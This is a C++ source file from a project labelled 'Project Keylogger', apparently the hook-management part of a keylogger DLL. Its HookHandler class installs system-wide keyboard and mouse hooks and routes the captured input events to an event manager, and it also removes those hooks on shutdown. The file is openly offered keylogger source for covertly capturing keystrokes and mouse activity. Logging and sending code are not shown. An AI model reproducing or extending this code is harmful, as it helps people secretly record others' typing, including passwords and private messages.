/**
 *						Project Keylogger
 */

#include				"keylogger_dll/HookHandler.h"

 /**
  * HookHandler implementation
  */


  /**
   * @param EventManager&
   */
HookHandler::HookHandler(const EventManager& eventManager) : _eventManager(eventManager) {
}

/**
 * Add the AHook parameter to the list of hooks the handler contains.
 *
 * @param AHook
 * @return bool
 */
const bool HookHandler::addHook(IHook* hook) {
	_hooks.push_back(hook);
	return true;
}

/**
 * Remove the AHook& paramater from the hook list contained by the HookHandler
 *
 * @param const AHook&
 * @return bool
 */
const bool HookHandler::removeHook(IHook* hook) {
	bool good = true;

	for (std::vector<IHook*>::iterator it = _hooks.begin(); it != _hooks.end(); it++)
	{
		if (*it == hook)
		{
			if (!hook->unsetHook())
				good = false;
			_hooks.erase(it);
			break;
		}
	}
	return good;
}

const bool HookHandler::init()
{
	//Set the keyboard hook
	IHook* keyboardHook = new KeyboardHook(*((IHookObserver*)(new KeyboardHookObserver(this->_eventManager))));
	IHook* mouseHook = new MouseHook(*((IHookObserver*)(new MouseHookObserver(this->_eventManager))));

	this->addHook(keyboardHook);
	this->addHook(mouseHook);
	if (keyboardHook == NULL || !keyboardHook->setHook() || mouseHook == NULL || !mouseHook->setHook())
	{
		std::cout << "HookHandler::init() : Fatal error on hook set !" << std::endl;
		return false;
	}
	return true;
}

const bool HookHandler::stop()
{
	bool good = true;
	std::vector<IHook*> tmp;
	for (IHook* hook : _hooks)
	{
		tmp.push_back(hook);
	}
	for (IHook* hook : tmp)
	{
		if (!this->removeHook(hook))
			good = false;
	}
	return good;
}